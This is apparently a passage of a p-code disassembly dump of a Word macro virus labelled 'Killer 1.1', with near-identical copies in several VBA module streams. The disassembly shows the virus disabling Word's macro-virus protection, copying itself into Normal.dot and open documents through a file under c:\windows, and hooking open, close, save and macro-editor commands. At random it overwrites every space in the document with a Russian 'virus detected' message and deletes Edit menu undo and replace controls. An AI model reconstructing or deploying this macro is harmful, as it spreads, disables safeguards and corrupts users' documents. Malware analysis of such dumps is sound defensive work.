' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer33 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer34 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer35 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer36 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer37 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
